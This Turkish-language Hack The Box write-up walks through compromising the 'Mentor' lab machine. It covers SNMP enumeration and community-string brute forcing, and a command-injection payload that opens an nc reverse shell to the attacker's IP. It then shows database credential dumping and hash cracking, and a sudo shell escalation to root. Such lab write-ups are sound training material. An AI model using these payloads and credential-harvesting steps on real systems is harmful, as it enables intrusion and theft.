---

title: 🟠 HTB - Mentor
author: Acivik
date: 2023-03-11 18:00:00 +0300 
categories: [CTF, Hack The Box]
tags: [hackthebox, ctf, hacking, writeup, mentor, walktrough, medium, linux]

---

![https://i.ibb.co/ZT4gHFM/Mentor.png](https://i.ibb.co/ZT4gHFM/Mentor.png)

---

# <span style="color:#AA0E1C"><b># Reconnaissance</b></span>

## <span style="color:#0096FF">Nmap</span>

`nmap` 22 ssh ve 80 http olmak üzere iki tane açık tcp portu keşfeder.

```bash
root@acivik:~/Mentor# nmap -p- --min-rate 5000 10.129.86.80
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-13 06:34 EST
Nmap scan report for 10.129.86.80
Host is up (0.19s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 19.08 seconds

root@acivik:~/Mentor# nmap -p22,80 -sV -sC 10.129.86.80 -oN nmap/tcpscan
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-13 06:35 EST
Nmap scan report for 10.129.86.80
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c73bfc3cf9ceee8b4818d5d1af8ec2bb (ECDSA)
|_  256 4440084c0ecbd4f18e7eeda85c68a4f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://mentorquotes.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.91 seconds
root@acivik:~/Mentor# 
```

OpenSSH ve Apache versiyonlarına göre muhtemelen Ubuntu Jammy çalışıyor.

Web sitesinin `mentorquotes.htb` adresine yönlendirdiğini görüyorum bunu `/etc/hosts` dosyasına kaydedelim.

UDP portları için tekrar bir tarama yaptım. `snmp` portu açık bulundu.

```bash
root@acivik:~/Mentor# nmap -sU 10.129.86.80 --min-rate 1000 --open
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-13 06:51 EST
Nmap scan report for mentorquotes.htb (10.129.86.80)
Host is up (0.16s latency).
Not shown: 990 open|filtered udp ports (no-response), 9 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 4.59 seconds

root@acivik:~/Mentor# nmap -sU -p161 10.129.86.80 -sV -sC -oN nmap/udpscan
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-13 06:52 EST
Nmap scan report for mentorquotes.htb (10.129.86.80)
Host is up (0.16s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: a124f60a99b99c6200000000
|   snmpEngineBoots: 67
|_  snmpEngineTime: 21h43m38s
| snmp-sysdescr: Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
|_  System uptime: 21h43m38.01s (7821801 timeticks)
Service Info: Host: mentor

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.13 seconds
root@acivik:~/Mentor#
```

## <span style="color:#0096FF">VirtualHost Scan</span>

```bash
root@acivik:~/Mentor# wfuzz -c -z file,/usr/share/seclists/Discovery/DNS/namelist.txt -u http://mentorquotes.htb/ -H "Host: FUZZ.mentorquotes.htb" --hc 302
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://mentorquotes.htb/
Total requests: 151265

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                    
=====================================================================

000005961:   404        0 L      2 W        22 Ch       "api"
```

`api.mentorquotes.htb` adresini de /etc/hosts dosyasına kaydedelim ve enumerate aşamasına geçelim.

# <span style="color:#AA0E1C"><b># Enumeration</b></span>

## <span style="color:#0096FF">Web Sitesi - mentorquotes.htb -80/tcp HTTP</span>

![https://i.ibb.co/X5g0wcb/mentorpage.png](https://i.ibb.co/X5g0wcb/mentorpage.png)

Sayfada buna benzer sözlerden başka bir şey yok.

### <span style="color:#FFC300">Directory Brute Force</span>

```bash
root@acivik:~/Mentor# feroxbuster -u http://mentorquotes.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://mentorquotes.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      167l      621w     5506c http://mentorquotes.htb/
403      GET        9l       28w      281c http://mentorquotes.htb/server-status
[####################] - 3m     62282/62282   0s      found:2       errors:8      
[####################] - 3m     62282/62282   281/s   http://mentorquotes.htb/
```

Anlaşılan burada bir şey bulamayacağız.

## <span style="color:#0096FF">Web Sitesi - api.mentorquotes.htb -80/tcp HTTP</span>

![https://i.ibb.co/W5PJXBS/apipage.png](https://i.ibb.co/W5PJXBS/apipage.png)

### <span style="color:#FFC300">Directory Brute Force</span>

```bash
root@acivik:~/Mentor# feroxbuster -u http://api.mentorquotes.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://api.mentorquotes.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
307      GET        0l        0w        0c http://api.mentorquotes.htb/admin => http://api.mentorquotes.htb/admin/
200      GET       31l       62w      969c http://api.mentorquotes.htb/docs
307      GET        0l        0w        0c http://api.mentorquotes.htb/users => http://api.mentorquotes.htb/users/
307      GET        0l        0w        0c http://api.mentorquotes.htb/quotes => http://api.mentorquotes.htb/quotes/
403      GET        9l       28w      285c http://api.mentorquotes.htb/server-status
[####################] - 4m     62282/62282   0s      found:5       errors:12     
[####################] - 4m     62282/62282   224/s   http://api.mentorquotes.htb/
```

![https://i.ibb.co/1R44fmC/apidocs.png](https://i.ibb.co/1R44fmC/apidocs.png)

```bash
405      GET        1l        3w       31c http://api.mentorquotes.htb/admin/backup
```

Bu sayfa için authorization isteniyor.

Create user apisi ile kullanıcı oluşturdum.

```json
{
  "email": "a@civik.com",
  "username": "acivik",
  "password": "belkidelirdik"
}
```

Login olduğumuzda çıktı olarak jwt vermektedir.

![https://i.ibb.co/Vgtf5BQ/login.png](https://i.ibb.co/Vgtf5BQ/login.png)

Elde edilen tokeni authorization headerı ile /admin/backup için deneyelim.

![https://i.ibb.co/MGpbB20/403.png](https://i.ibb.co/MGpbB20/403.png)

`http://api.mentorquotes.htb/openapi.json` sayfasına baktığınızda bir kullanıcı bilgisi göreceksiniz.

```json
"contact":{
		"name":"james",
		"url":"http://mentorquotes.htb",
		"email":"james@mentorquotes.htb"
},
```

Bu bilgiler ile user oluşturmayı denediğimizde şöyle bir yanıt alacağız.

```json
{"detail":"User already exists! "}
```

## <span style="color:#0096FF">SNMP - 161/udp</span>

SNMP servisi makinenin uzaktan yönetilmesine ve izlenmesini sağlar. Makine hakkında önemli bilgileri elde edebiliriz.

```bash
root@acivik:~/Mentor# snmp-check 10.129.86.80
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.129.86.80:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 10.129.86.80
  Hostname                      : mentor
  Description                   : Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
  Contact                       : Me <admin@mentorquotes.htb>
  Location                      : Sitting on the Dock of the Bay
  Uptime snmp                   : 1 day, 01:17:03.66
  Uptime system                 : 1 day, 01:16:51.23
  System date                   : 2022-12-13 15:25:16.0
```

`snmpbrute.py` ile `internal` ve `public` adında iki tane community string keşfettik.

```bash
root@acivik:~/Mentor# python snmpbrute.py -t 10.129.86.80
Trying identified strings for READ-WRITE ...

Identified Community strings
	0) 10.129.86.80    internal (v2c)(RO)
	1) 10.129.86.80    public (v1)(RO)
	2) 10.129.86.80    public (v2c)(RO)
	3) 10.129.86.80    public (v1)(RO)
	4) 10.129.86.80    public (v2c)(RO)
```

`snmpwalk` aracını kullanarak sistem hakkında bilgi toplamaya başlayabiliriz.

Fazla trafik oluşturmak istemediğim için sadece `hrSWRunName (OID .1.3.6.1.2.1.25.4.2)` istemek benim için yeterli olacaktır.

Çalışan process’ler görüntülenir.

```bash
root@acivik:~/Mentor# snmpwalk -v 2c -c internal 10.129.86.80 hrSWRunName | tee snmpout.txt
...
HOST-RESOURCES-MIB::hrSWRunName.1997 = STRING: "python"
HOST-RESOURCES-MIB::hrSWRunName.2019 = STRING: "python3"
HOST-RESOURCES-MIB::hrSWRunName.2020 = STRING: "python3"
HOST-RESOURCES-MIB::hrSWRunName.2064 = STRING: "postgres"
HOST-RESOURCES-MIB::hrSWRunName.2065 = STRING: "postgres"
HOST-RESOURCES-MIB::hrSWRunName.2083 = STRING: "login.py"
...
```

`login.py` çalıştırılıyor. Şimdi `hrSWRunTable` kullanarak `2083` idsini grepleyeceğim.

```bash
root@acivik:~/Mentor# snmpwalk -v 2c -c internal 10.129.86.80 hrSWRunTable | grep 2083
HOST-RESOURCES-MIB::hrSWRunIndex.2083 = INTEGER: 2083
HOST-RESOURCES-MIB::hrSWRunName.2083 = STRING: "login.py"
HOST-RESOURCES-MIB::hrSWRunID.2083 = OID: SNMPv2-SMI::zeroDotZero
HOST-RESOURCES-MIB::hrSWRunPath.2083 = STRING: "/usr/bin/python3"
HOST-RESOURCES-MIB::hrSWRunParameters.2083 = STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"
HOST-RESOURCES-MIB::hrSWRunParameters.120830 = ""
HOST-RESOURCES-MIB::hrSWRunType.2083 = INTEGER: application(4)
HOST-RESOURCES-MIB::hrSWRunType.120830 = INTEGER: operatingSystem(2)
HOST-RESOURCES-MIB::hrSWRunStatus.2083 = INTEGER: runnable(2)
HOST-RESOURCES-MIB::hrSWRunStatus.120830 = INTEGER: invalid(4)
```

Elde edilen parolayı denediğimizde başarılı oluyoruz ve jwt elde ediyoruz.

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0
```

# <span style="color:#AA0E1C"><b># Foothold - Shell from Docker</b>

```bash
root@acivik:~/Mentor# curl -i -s -k -X 'POST' -H 'Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' 'http://api.mentorquotes.htb/admin/backup'
HTTP/1.1 422 Unprocessable Entity
Date: Tue, 13 Dec 2022 15:51:16 GMT
Server: uvicorn
content-length: 81
content-type: application/json

{"detail":[{"loc":["body"],"msg":"field required","type":"value_error.missing"}]}
```

```json
{"detail":[{"loc":["body","path"],"msg":"field required","type":"value_error.missing"}]}
```

Beklenen format bu şekildedir.

Bir süre test ettikten sonra `path` parametresinin os command injection zafiyetine karşı savunmasız olduğu ortaya çıktı.

```bash
root@acivik:~/Mentor# curl -i -s -k -X 'POST' -H 'content-type: application/json' -H 'Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' --data '{"path":";wget 10.10.14.13:1234 #"}' 'http://api.mentorquotes.htb/admin/backup'

root@acivik:~/Mentor# nc -lnvp 1234
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.129.86.80.
Ncat: Connection from 10.129.86.80:42848.
GET / HTTP/1.1
Host: 10.10.14.13:1234
User-Agent: Wget
Connection: close
```

Reverse shell almak için kullandığımızda başarılı oluyoruz.

```bash
root@acivik:~/Mentor# curl -i -s -k -X 'POST' -H 'content-type: application/json' -H 'Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' --data '{"path":";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.13 1234 >/tmp/f #"}' 'http://api.mentorquotes.htb/admin/backup'

root@acivik:~/Mentor# nc -lnvp 1234
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.129.86.80.
Ncat: Connection from 10.129.86.80:42785.
/bin/sh: can't access tty; job control turned off
/app #

```

Docker Container içerisinden root shell elde ettik.

```bash
/app/app # ls -la
total 28
drwxr-xr-x    1 root     root          4096 Nov 10 16:00 .
drwxr-xr-x    1 root     root          4096 Dec 13 16:11 ..
-rw-r--r--    1 root     root             0 Jun  4  2022 __init__.py
drwxr-xr-x    1 root     root          4096 Nov 10 16:00 __pycache__
drwxr-xr-x    1 root     root          4096 Nov 10 16:00 api
-rw-r--r--    1 root     root             0 Jun  4  2022 config.py
-rw-r--r--    1 root     root          1001 Jun  7  2022 db.py
-rw-r--r--    1 root     root          1149 Jun  4  2022 main.py
-rw-r--r--    1 root     root           704 Jun  4  2022 requirements.txt
/app/app #
```

Dosyaları inceleyelim.

```bash
/app/app # cat db.py
import os
[...]
# Database url if none is passed the default one is used
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")
[...]
# SQLAlchemy for users
engine = create_engine(DATABASE_URL)
metadata = MetaData()
users = Table(
    "users",
    metadata,
    Column("id", Integer, primary_key=True),
    Column("email", String(50)),
    Column("username", String(50)),
    Column("password", String(128) ,nullable=False)
)
# Databases query builder
database = Database(DATABASE_URL)

/app/app #
```

`172.22.0.1` ipsinde bulunan postgresql sunucusuna ait bilgileri içermektedir.

# <span style="color:#AA0E1C"><b># Shell as svc</b></span>

`Chisel` ile tünelleme yaparak postgresql servisine erişmeye çalışalım.

```bash
Saldırgan Makine:
root@acivik:~/Mentor# chisel server --reverse -p 1337

Hedef Makine:
/tmp # ./chisel client --max-retry-count=1 10.10.14.13:1337 R:5432:172.22.0.1:5432
```

Chiseli çalıştırdıktan sonra artık postgresql’e erişebiliriz.

```bash
root@acivik:~/Mentor# psql -Upostgres -W -d mentorquotes_db -h 127.0.0.1 -p 5432
Password: 
psql (14.5 (Debian 14.5-3), server 13.7 (Debian 13.7-1.pgdg110+1))
Type "help" for help.

mentorquotes_db=# \dt
          List of relations
 Schema |   Name   | Type  |  Owner   
--------+----------+-------+----------
 public | cmd_exec | table | postgres
 public | quotes   | table | postgres
 public | users    | table | postgres
(3 rows)

mentorquotes_db=# select * from users;
 id |         email          |  username   |             password             
----+------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503
  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
  4 | a@civik.com            | acivik      | bd359bb9358b0ff90d1ae6241e48b213
(3 rows)

mentorquotes_db=#
```

svc kullanıcısının parolası kırıldı.

```
53f22d0dfa10dce7e29cd31f4f953fd8 : 123meunomeeivani
```

svc ile ssh bağlantısı kuralım.

```bash
root@acivik:~/Mentor# sshpass -p '123meunomeeivani' ssh svc@mentorquotes.htb
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-56-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Dec 13 04:45:54 PM UTC 2022

  System load:                      0.0
  Usage of /:                       65.8% of 8.09GB
  Memory usage:                     16%
  Swap usage:                       0%
  Processes:                        247
  Users logged in:                  0
  IPv4 address for br-028c7a43f929: 172.20.0.1
  IPv4 address for br-24ddaa1f3b47: 172.19.0.1
  IPv4 address for br-3d63c18e314d: 172.21.0.1
  IPv4 address for br-7d5c72654da7: 172.22.0.1
  IPv4 address for br-a8a89c3bf6ff: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.129.86.80
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:f754

  => There are 4 zombie processes.

0 updates can be applied immediately.

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Dec 12 10:22:58 2022 from 10.10.14.40
svc@mentor:~$
```

# <span style="color:#AA0E1C"><b># Privilege Escalation: svc → james</b></span>

```bash
svc@mentor:/tmp$ find /etc -type f -exec grep -H 'Password' {} \; 2>/dev/null
/etc/ssh/ssh_config:#   PasswordAuthentication yes
/etc/ssh/sshd_config:#PasswordAuthentication yes
/etc/ssh/sshd_config:#PermitEmptyPasswords no
/etc/ssh/sshd_config:# PasswordAuthentication.  Depending on your PAM configuration,
/etc/ssh/sshd_config:# PAM authentication, then enable this but set PasswordAuthentication
/etc/ssh/sshd_config:PasswordAuthentication yes
/etc/snmp/snmpd.conf:createUser bootstrap MD5 SuperSecurePassword123__ DES
/etc/ssl/openssl.cnf:# Passwords for private keys if not present they will be prompted for
/etc/ssl/openssl.cnf:challengePassword		= A challenge password
/etc/ssl/openssl.cnf:challengePassword_min		= 4
/etc/ssl/openssl.cnf:challengePassword_max		= 20
/etc/ssl/openssl.cnf:[pbm] # Password-based protection for Insta CA
/etc/fwupd/remotes.d/lvfs-testing.conf:#Password=
/etc/fwupd/redfish.conf:#Password=
/etc/login.defs:# Password aging controls:
svc@mentor:/tmp$

# /etc/snmp/snmpd.conf: SuperSecurePassword123__
```

Config dosyalarının içerisinde bir password bulunur ve james kullanıcısına geçiş yapılır.

# <span style="color:#AA0E1C"><b># PrivEsc: james → root</b></span>

```bash
james@mentor:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on mentor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on mentor:
    (ALL) /bin/sh
james@mentor:~$ sudo /bin/sh
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
1391702197ec356622640c662f3f5e89
#
```

`/bin/sh` dosyasını sudo ile çalıştırarak root olabiliriz.
